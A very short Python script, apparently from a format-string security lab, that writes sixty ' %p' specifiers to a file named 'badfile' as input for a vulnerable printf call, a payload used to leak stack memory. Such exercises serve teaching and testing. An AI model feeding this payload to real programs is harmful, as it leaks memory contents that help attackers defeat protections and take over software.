payload = (b" %p")*60

with open("badfile", "wb") as f:
    f.write(payload)